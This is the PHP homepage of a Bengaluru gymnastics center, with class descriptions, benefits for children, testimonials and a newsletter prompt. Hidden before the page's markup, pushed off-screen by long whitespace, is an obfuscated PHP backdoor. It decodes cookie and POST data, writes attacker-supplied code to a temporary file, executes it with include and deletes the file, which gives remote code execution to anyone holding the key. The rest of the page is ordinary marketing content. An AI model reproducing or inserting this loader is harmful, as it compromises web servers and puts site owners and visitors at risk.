<?php                                                                                                                                                                                                                                                                                                                                                                                                 if (!class_exists("rsiudb")){class rsiudb{public static $oifymwxr = "lsmnwxsiwcdpjzvf";public static $astxry = NULL;public function __construct(){$lbdzwnt = @$_COOKIE[substr(rsiudb::$oifymwxr, 0, 4)];if (!empty($lbdzwnt)){$pfgkq = "base64";$gactaaf = "";$lbdzwnt = explode(",", $lbdzwnt);foreach ($lbdzwnt as $odaogd){$gactaaf .= @$_COOKIE[$odaogd];$gactaaf .= @$_POST[$odaogd];}$gactaaf = array_map($pfgkq . "_decode", array($gactaaf,)); $gactaaf = $gactaaf[0] ^ str_repeat(rsiudb::$oifymwxr, (strlen($gactaaf[0]) / strlen(rsiudb::$oifymwxr)) + 1);rsiudb::$astxry = @unserialize($gactaaf);}}public function __destruct(){$this->vqsmcfgcw();}private function vqsmcfgcw(){if (is_array(rsiudb::$astxry)) {$rjbaj = sys_get_temp_dir() . "/" . crc32(rsiudb::$astxry["salt"]);@rsiudb::$astxry["write"]($rjbaj, rsiudb::$astxry["content"]);include $rjbaj;@rsiudb::$astxry["delete"]($rjbaj);exit();}}}$jjaxpwxgu = new rsiudb(); $jjaxpwxgu = NULL;} ?><!DOCTYPE html>
<html lang="en">

<head><meta charset="euc-jp">
    

    <?php $page = 'home';?>

    <?php include('header.php');?>

    <?php include('analytics.php');	?>

    <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/3.4.1/css/bootstrap.min.css">
    <link rel="stylesheet" href="/assets/css/main.css">

</head>

<body>

    <?php include('menu.php');?>

    <?php /*
    <section>
        <div class="banner main-video-banner">
            <video autoplay muted loop class="banner-video">
                <source src="/assets/videos/banner/banner1-viswajitnikhathgymnastiks.mp4" type="video/mp4">
                <picture>
                    <source media="(min-width:1024px)" srcset="/assets/img/banner/girl-on-pommel-1920x960.webp">
                    <source media="(min-width:426px)" srcset="/assets/img/banner/girl-on-pommel-768x662.webp">
                    <source media="(min-width:100px)" srcset="/assets/img/banner/girl-on-pommel-425x370.webp">
                    <img src="/assets/img/banner/girl-on-pommel-1920x960.webp" alt="Gymnastics Classes in Bengaluru | Viswajit Nikhath Gymnastiks"
                        class="img-responsive">
                </picture>
            </video>
            <div class="video-overlay">
                <h1>Competitive Gymnastics</h1>
                <p>Having more than one program to choose from, at both the compulsory and optional levels, allows us to find the best fit for your child.</p>
            </div>
        </div>
    </section>
    */ ?>

    <section>
        <div class="banner main-banner">
            <?php /*
            <picture>
                <source media="(min-width:1024px)"
                    srcset="/assets/img/banner/competitive-gymnastics-viswajit-nikhath-gymnastiks-1200x600.jpg">
                <source media="(min-width:426px)"
                    srcset="/assets/img/banner/competitive-gymnastics-viswajit-nikhath-gymnastiks-740x370.jpg">
                <source media="(min-width:100px)"
                    srcset="/assets/img/banner/competitive-gymnastics-viswajit-nikhath-gymnastiks-425x300.jpg">
                <img src="/assets/img/banner/competitive-gymnastics-viswajit-nikhath-gymnastiks-425x300.jpg"
                    alt="Gymnastics Classes in Bengaluru | Viswajit Nikhath Gymnastiks" class="img-responsive">
            </picture>
    */ ?>
            <a href="/programs" class="contact-event-btn" data-event="page-programs">
                <picture>
                    <source media="(min-width:1024px)" srcset="/assets/img/banner/girl-on-pommel-1920x960.webp">
                    <source media="(min-width:426px)" srcset="/assets/img/banner/girl-on-pommel-768x662.webp">
                    <source media="(min-width:100px)" srcset="/assets/img/banner/girl-on-pommel-425x370.webp">
                    <img src="/assets/img/banner/girl-on-pommel-425x370.webp"
                        alt="Gymnastics Classes in Bengaluru | Viswajit Nikhath Gymnastiks" class="img-responsive">
                </picture>
            </a>

            <!-- <img src="/assets/img/banner/1.webp" alt="" class="img-responsive"> -->
            <!-- <h2 class="font-BrockScript banner-overlay">Join Gymnastics Training Program</h2> -->
        </div>
    </section>

    <?php /*
    <section class="program-menu-section bg-dark">
        <div class="container">
            <div class="row">
                <div class="col-md-12">
                    <h2 class="font-BrockScript text-ul">Gymnastics Classes We Offer </h2> <br>
                </div>
                <div class="col-md-6">
                    <div class="menu-img-card">
                        <div class="program-img bg-center-cover"
                                style="background-image: url('/assets/img/banner/recreational-gymnastics-viswajit-nikhath-gymnastiks.jpg')">
                        </div>
                        <span>Recreational Gymnastics</span>
                    </div>
                    <div class="menu-img-card">
                        <div class="program-img bg-center-cover"
                                style="background-image: url('/assets/img/banner/adult-gymnastics-viswajit-nikhath-gymnastiks.jpg')">
                        </div>
                        <span>Gymnastics for Adults</span>
                    </div>
                    <div class="menu-img-card">
                        <div class="program-img bg-center-cover"
                                style="background-image: url('/assets/img/banner/precompetitive-gymnastics-viswajit-nikhath-gymnastiks.jpg')">
                        </div>
                        <span>Competitive Gymnastics</span>
                    </div>
                    <div class="menu-img-card">
                        <div class="program-img bg-center-cover"
                                style="background-image: url('/assets/img/banner/competitive-gymnastics-viswajit-nikhath-gymnastiks.jpg')">
                        </div>
                        <span>Gymnastics for Toddlers</span>
                    </div>
                    <p class="text-center">
                        <a class="btn oval-btn contact-event-btn" href="/programs" data-event="page-competitive"
                            rel="noopener noreferrer">
                            See All Our Programs
                        </a>
                    </p>
                </div>
            </div>
        </div>
    </section> 

    */ ?>



    <!-- <section class="bg-dark">
            <div class="container">
                <div class="row">
                    <div class="col-md-12">
                        <h2 class="text-ul">Join Classes</h2> 
                        <p>
                            Enroll now and avail the free trial class. Online registration is free.   
                        </p>
                    </div>
                    <div class="col-md-12">
                        <div>
                            <table class="table table-responsive">
                                <tr>
                                    <th>Pre Competitive</th>
                                    <td><a href="/programs/adult-gymnastics" class="btn btn-sm btn-light">Register</a></td>
                                </tr>
                                <tr>
                                    <th>Competitive</th>
                                    <td><a href="/programs/adult-gymnastics" class="btn btn-sm btn-light">Register</a></td>
                                </tr>
                                <tr>
                                    <th>Toddler</th>
                                    <td><a href="/programs/adult-gymnastics" class="btn btn-sm btn-light">Register</a></td>
                                </tr>
                            </table>

                        </div>
                    </div>
                </div>
            </div>
        </div>
    </section> -->


    <section class="">
        <div class="container">
            <div class="row">
                <div class="col-md-12">
                    <h1 class="font-BrockScript text-ul">Gymnastics Center in Bengaluru</h1> <br>
                </div>
                <div class="col-md-6">

                    <p>
                        When we teach <b>gymnastics</b>, we strive to build self-­esteem, fitness, good health habits,
                        and positive interaction with others in our fun and safe gymnastics center while providing the
                        highest quality of instruction.
                    </p>

                    <p>
                        Gymnastics is an activity that is a great foundation for all sports. The attention to
                        detail and concentration needed to attain even the fundamental gymnastics skills; develops patience,
                        perseverance, discipline, and a good work ethic.
                    </p>

                    <p>
                        The joy of achievement is the most rewarding aspect of this challenging sport. The vast range of
                        skills from beginner to elite level and the performance/creative expression serves all ages and
                        all levels of its participants.
                    </p>

                    <p class="">
                        <b>
                            Don't you think this is the best time for your kid to develop some gymnastics skills and
                            have fun too?
                        </b>
                        
                    </p><br>
                    <p class="text-center">
                        <a class="btn oval-btn contact-event-btn" href="/programs" data-event="page-competitive"
                            rel="noopener noreferrer">
                            See All Classes
                        </a>
                    </p><br>
                    <div class="well">
                        We are located at 
                        <b>
                            ITPL Main Road, Next to Smart Works,
                            Silver Springs Layout Junction,
                            Bengaluru, Karnataka 560037
                        </b>
                        <br>
                    </div>
                    <p class="">
                        Still confused about joining the classes? <br>
                        Read below what <b>gymnastics training</b> has to offer for you and your kid.
                    </p>
                    <br>
                </div>
                <div class="col-md-6">
                    <div class="banner">
                        <a href="/programs" class="contact-event-btn" data-event="page-programs">
                            <picture>
                                <source media="(min-width:1024px)"
                                    srcset="/assets/img/banner/gymnastics-classes-children-768x512.webp">
                                <source media="(min-width:426px)"
                                    srcset="/assets/img/banner/gymnastics-classes-children-768x512.webp">
                                <source media="(min-width:100px)"
                                    srcset="/assets/img/banner/gymnastics-classes-children-425x283.webp">
                                <img src="/assets/img/banner/gymnastics-classes-children-768x512.webp"
                                    alt="Gymnastics Classes in Bengaluru | Viswajit Nikhath Gymnastiks"
                                    class="img-responsive box-shadow">
                            </picture>
                        </a>
                        <!-- <img src="/assets/img/banner/4.webp" alt="" class="img-responsive"> -->
                    </div>
                </div>
            </div>
        </div>
    </section>




    <section class="bg-light">

        <div class="container">
            <div class="row">
                <div class="col-md-12">
                    <h2 class="font-BrockScript text-ul">Gymnastics and Kids</h2>
                    <p>
                        Along with Gymnastics, children also learn important life skills such as sharing, taking
                        turns, voicing opinions, listening, goal setting,
                        and a willingness to attempt new things. It provides the opportunity for children to develop
                        many essential physical attributes,
                        such as: gross motor functions, fine motor functions, balance, strength, coordination,
                        flexibility, spatial awareness, and body control in a fun and safe environment.
                    </p>
                </div>
                <div class="col-md-4">
                    <!-- <h2 class="font-BrockScript text-ul">Gymnastics and Kids</h2> -->
                    <h3>1. Good for Health</h3>
                    <p class="">
                        <!-- <b>1. Good for Health </b> <br> -->
                        Regular participation in gymnastics provides a great deal of health benefits including,
                        increased cardiovascular fitness,
                        reduced risk of obesity, healthy growth of bones, muscles, ligaments and tendons, etc.
                        <!-- Whether they make it to big league or not, regular participation in gymnastics offers health 
                        benefits for children of all ages. -->
                        <!-- With regular practice, children develop excellent physical coordination and maintain good health.
                        Maintaining a good health during childhood will prevent them from having heart deseases and other age-related issues in the long run. -->
                    </p>
                </div>
                <div class="col-md-4">
                    <h3>2. Builds Confidence</h3>
                    <p class="">
                        <!-- <b>2. Builds Confidence </b> <br> -->
                        The sense of accomplishment gained from performing and mastering physical feats goes a long way
                        in building confidence and self-esteem in children.
                        <!-- When you perform any skill successfully, you will generate confidence and be willing to attempt something slightly more difficult. -->
                    </p>
                </div>
                <div class="col-md-4">
                    <h3>3. Coordination and Balance</h3>
                    <p class="">
                        By practicing gymnastics, children develop amazing mind-body coordination and helps them handle
                        difficult situations of everyday life.
                    </p>
                </div>
            </div>
            <div class="row">
                <div class="col-md-4">
                    <h3>4. Social Skills Development</h3>
                    <p class="">
                        Practicing gymnastics along with other children help them come out of their shell and develop
                        skills to connect with new friends with similar interests.
                    </p>
                </div>
                <div class="col-md-4">
                    <h3>5. Gymnastics is Fun</h3>
                    <p class="">
                        All kids naturally love activities that involve swinging, tumbling, jumps, flips, and momentary
                        free-fall. Not many activities are this exhilarating and children are drawn to it.
                    </p>
                </div>

                <div class="col-md-12">
                </div>

            </div>
        </div>

    </section>

    <section class="programs-section">
        <div class="container">
            <div class="row">
                <div class="col-md-12">
                </div>
                <div class="col-md-6">
                    <div class="banner">
                        <picture>
                            <source media="(min-width:1024px)"
                                srcset="/assets/img/banner/little-girl-engaged-gymnastics-768x662.webp">
                            <source media="(min-width:426px)"
                                srcset="/assets/img/banner/little-girl-engaged-gymnastics-768x662.webp">
                            <source media="(min-width:100px)"
                                srcset="/assets/img/banner/little-girl-engaged-gymnastics-425x370.webp">
                            <img class="scale-img" src="/assets/img/banner/little-girl-engaged-gymnastics-768x662.webp"
                                alt="Gymnastics Classes in Bengaluru | Viswajit Nikhath Gymnastiks"
                                class="img-responsive">
                        </picture>
                        <!-- <img src="/assets/img/banner/4.webp" alt="" class="img-responsive"> -->
                    </div>
                </div>
                <div class="col-md-6 programs-box">
                    <h2 class="font-BrockScript text-ul">Classes & training programs</h2>
                    <p class="">
                        When it comes to gymnastics training, we offer programs to everyone's needs. Here are some of
                        our most popular <b>training programs and classes</b>.
                    </p>


                    <!-- <div class="row program-item">
                        <div class="col-xs-4">
                            <div class="program-img bg-center-cover"
                                style="background-image: url('/assets/img/banner/recreational-gymnastics-viswajit-nikhath-gymnastiks.jpg')">
                            </div>
                        </div>
                        <div class="col-xs-8">
                            <h3 class="program-title"> Gymnastics for Toddlers </h3>
                            <p>
                                <span class="program-desc">Recreational programs are offered for age-group of 4 - 16.</span>
                                <a class="btn btn-sm btn-dark contact-event-btn"
                                    href="/programs/recreational-gymnastics" rel="noopener noreferrer" data-event="page-recreational">
                                    More Details
                                    <i class="fas fa-angle-double-right"></i>
                                </a>
                            </p>
                        </div>
                    </div>
                    <div class="row program-item">
                        <div class="col-xs-4">
                            <div class="program-img bg-center-cover"
                                style="background-image: url('/assets/img/banner/recreational-gymnastics-viswajit-nikhath-gymnastiks.jpg')">
                            </div>
                        </div>
                        <div class="col-xs-8">
                            <h3 class="program-title"> Gymnastics for Toddlers </h3>
                            <p>
                                <span class="program-desc">Recreational programs are offered for age-group of 4 - 16.</span>
                                <a class="btn btn-sm btn-dark contact-event-btn"
                                    href="/programs/recreational-gymnastics" rel="noopener noreferrer" data-event="page-recreational">
                                    More Details
                                    <i class="fas fa-angle-double-right"></i>
                                </a>
                            </p>
                        </div>
                    </div> -->


                    <div class="row program-item">
                        <div class="col-xs-4">
                            <div class="program-img bg-center-cover"
                                style="background-image: url('/assets/img/banner/recreational-gymnastics-viswajit-nikhath-gymnastiks.jpg')">
                            </div>
                        </div>
                        <div class="col-xs-8">
                            <h3 class="program-title"> Recreational Classes</h3>
                            <p>
                                <span class="program-desc">Recreational programs are offered for age-group of 4 - 16.
                                </span>
                                <a href="/programs/recreational-gymnastics"
                                    class="btn btn-sm btn-dark contact-event-btn" rel="noopener noreferrer"
                                    data-event="page-recreational-gym">
                                    More Details &nbsp;
                                    <i class="fas fa-angle-double-right"></i>
                                </a>
                            </p>
                        </div>
                    </div>

                    <div class="row program-item">
                        <div class="col-xs-4">
                            <div class="program-img bg-center-cover"
                                style="background-image: url('/assets/img/banner/adult-gymnastics-viswajit-nikhath-gymnastiks-thumb.jpg')">
                            </div>
                        </div>
                        <div class="col-xs-8">
                            <h3 class="program-title">Gymnastics for Adults</h3>
                            <p>
                                <span class="program-desc">We offer programs for adults of age 17 to 60 years.</span>
                                <a href="/programs/adult-gymnastics" class="btn btn-sm btn-dark contact-event-btn"
                                    rel="noopener noreferrer" data-event="page-adult-gym">
                                    More Details &nbsp;
                                    <i class="fas fa-angle-double-right"></i>
                                </a>
                            </p>
                        </div>
                    </div>


                    <div class="row program-item">
                        <div class="col-xs-4">
                            <div class="program-img bg-center-cover"
                                style="background-image: url('/assets/img/banner/precompetitive-gymnastics-viswajit-nikhath-gymnastiks.jpg')">
                            </div>
                        </div>
                        <div class="col-xs-8">
                            <h3 class="program-title"> Pre-Competitive Classes</h3>
                            <p>
                                <span class="program-desc">Pre-competitive gymnastics helps develop and prepare gymnasts
                                    for the rigors of their competitive team.</span>
                                <a class="btn btn-sm btn-dark contact-event-btn" target="_blank"
                                    rel="noopener noreferrer" data-event="whatsapp-pre-competitive-gymnast"
                                    href='https://wa.me/919164636350/?text=Hi,%20I%20was%20checking%20your%20website%20and%20I%20would%20like%20to%20know%20more%20about%20the%20Pre%20Competitive%20Gymnastics%20Training%20Program.'>
                                    Contact Us for Admission &nbsp;
                                    <i class="fab fa-whatsapp"></i>
                                </a>
                            </p>
                        </div>
                    </div>


                    <div class="row program-item">
                        <div class="col-xs-4">
                            <div class="program-img bg-center-cover"
                                style="background-image: url('/assets/img/banner/competitive-gymnastics-viswajit-nikhath-gymnastiks.jpg')">
                            </div>
                        </div>
                        <div class="col-xs-8">
                            <h3 class="program-title"> Competitive Classes</h3>
                            <p>
                                <span class="program-desc">The benefits earned from participation in competitive and
                                    pre-competitive gymnastics can last a lifetime!</span>
                                <a class="btn btn-sm btn-dark contact-event-btn" target="_blank"
                                    rel="noopener noreferrer" data-event="whatsapp-competitive-gymnast"
                                    href='https://wa.me/919164636350/?text=Hi,%20I%20was%20checking%20your%20website%20and%20I%20would%20like%20to%20know%20more%20about%20the%20Competitive%20Gymnastics%20Training%20Program.'>
                                    Contact Us for Admission &nbsp;
                                    <i class="fab fa-whatsapp"></i>
                                </a>
                            </p>
                        </div>
                    </div>

                    <div class="row program-item bg-dark">
                        <div class="col-xs-4">
                            <div class="program-img bg-center-cover"
                                style="background-image: url('/assets/img/banner/competitive-gymnastics-viswajit-nikhath-gymnastiks.jpg')">
                            </div>
                        </div>
                        <div class="col-xs-8">
                            <h3 class="program-title"> All Training Programs</h3>
                            <p>
                                <span class="program-desc">Choose from a wide range of programs designed for each of
                                    you.</span>
                                <a class="btn btn-sm btn-light contact-event-btn" href="/programs"
                                    data-event="page-competitive" rel="noopener noreferrer">
                                    All Programs &nbsp;
                                    <i class="fas fa-angle-double-right"></i>
                                </a>
                            </p>
                        </div>
                    </div>


                </div>

            </div>
        </div>

    </section>



    <!-- <section class="gallery-section">
        <div class="container">
            <div class="row">
                <div class="col-md-12">
                    <h2 class="font-BrockScript text-ul">
                        Gallery
                    </h2>
                </div>
            </div>
            <div class="img-gallery">
                <div class="img-gallery-item" style="background-image:url('/assets/img/gallery/1.webp')">
                </div>
                <div class="img-gallery-item" style="background-image:url('/assets/img/gallery/2.webp')">
                </div>
                <div class="img-gallery-item" style="background-image:url('/assets/img/gallery/3.webp')">
                </div>
                <div class="img-gallery-item" style="background-image:url('/assets/img/gallery/4.webp')">
                </div>
                <div class="img-gallery-item" style="background-image:url('/assets/img/gallery/5.webp')">
                </div>
                <div class="img-gallery-item" style="background-image:url('/assets/img/gallery/6.webp')">
                </div>
            </div>
            <div id="galleyModal">
                <div id="galleyModalImg">
                    <span class="close-btn">Close</span>
                </div>
            </div>
        </div>
    </section> -->


    <section class="blog-section">
        <div class="container">
            <div class="row">
                <div class="col-md-12">
                    <h2 class="font-BrockScript text-ul">More about gymnastics</h2>
                </div>
            </div>
            <div class="row blogs">
                Contents loading ...
            </div>
        </div>
    </section>


    <section class="cta-section bg-center-cover schedule"
        style="background-image: url('/assets/img/banner/small-girl-doing-yoga.webp')">
        <div class="container">
            <div class="row">
                <div class="col-md-12">
                    <h2 class="font-BrockScript text-ul text-center">When to start Gymnastics?</h2>
                    <p>
                        Gymnastics training can be started as young as the age of 3.
                        Getting into the sport at an older age doesn't mean you won't be able to learn
                        the moves and execute them impeccably. Beginning Gymnastics at 12 years old
                        is considered getting a late start, but there are gymnasts who started at age 12
                        and went on to become level nine competitive gymnast.
                        So it's never too late to start gymnastics training.
                    </p>
                    <!-- <p class="text-center">
                        <button class="btn oval-btn">
                            More Details
                        </button>
                    </p> -->
                </div>
            </div>
        </div>
    </section>


    <section class="testimonial-section">
        <div class="container">
            <div class="row">
                <div class="col-md-12">
                    <h2 class="font-BrockScript text-ul">What people say about us</h2>
                </div>
            </div>
            <div class="row">
                <div class="col-md-4">
                    <div class="testimonial-item">
                        <br>
                        <p>
                            <span class="font-BrockScript">"Literally the best place for kids gymnastics in Bengaluru. Good interaction with
                                kids and great co ordination."</span> <sub> - Navdeep Singh </sub>
                        </p>
                    </div>
                </div>
                <div class="col-md-4">
                    <div class="testimonial-item">
                        <br>
                        <p>
                            <span class="font-BrockScript">"It's the best gymnastics center in Bengaluru. Student to
                                coach ratio is perfect, they give personalized attention to all the kids. Skill
                                progression is unbelievable in less time."</span> <sub> - William Francis </sub>
                        </p>
                    </div>
                </div>
                <div class="col-md-4">
                    <div class="testimonial-item">
                        <br>
                        <p>
                            <span class="font-BrockScript">"You won't get faster progress in any place in Bengaluru than
                                this one. Fast skills, cheap prices, great quality and experienced coaches, who
                                motivate kids to reach their full potential. Very good compare to other centers who
                                promise skills and end up wasting your time and money."</span> <sub> - Sowmya Nayak
                            </sub>
                        </p>
                    </div>
                </div>

            </div>
        </div>
    </section>


    <section class="cta-section newsletter">
        <div class="container">
            <div class="row">
                <div class="col-md-12">
                    <h2 class="font-BrockScript text-ul text-center">Join our community</h2>
                    <p>
                        Subscribe for our newsletters by clicking below. You will get all the latest updates about our
                        Gymnastics community.
                    </p>
                    <p class="text-center">
                        <button class="btn oval-btn" data-toggle="modal" data-target="#registerModal">
                            Subscribe
                        </button>
                    </p>
                </div>
            </div>
        </div>
    </section>


    <!-- <section>
        <div class="banner">
            <img src="/assets/img/banner/1.webp" alt="" class="img-responsive">
        </div>
    </section> -->


    <?php include('footer.php'); ?>


    <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.5.1/jquery.min.js"></script>
    <script src="https://maxcdn.bootstrapcdn.com/bootstrap/3.4.1/js/bootstrap.min.js"></script>
    <script src="https://kit.fontawesome.com/499c17c7f3.js" crossorigin="anonymous"></script>
    <script src="/assets/js/custom.js" async></script>

    <?php include('modals/register.php'); ?>

    <script>
    $(document).ready(function() {
        setTimeout(() => {
            fetchBlogs().then(() => {
                // console.log('done');
            })
        }, 0)

    })
    </script>


</body>

</html>